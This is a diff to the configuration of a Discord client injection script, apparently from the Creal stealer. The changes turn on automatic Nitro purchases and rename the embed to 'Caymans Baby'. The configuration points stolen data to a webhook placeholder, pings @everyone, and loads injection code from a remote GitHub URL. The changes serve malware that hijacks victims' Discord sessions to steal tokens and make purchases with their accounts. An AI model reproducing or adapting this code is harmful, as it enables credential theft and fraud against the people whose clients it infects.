@@ -8,10 +8,10 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
+  auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
+  embed_name: 'Caymans Baby', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
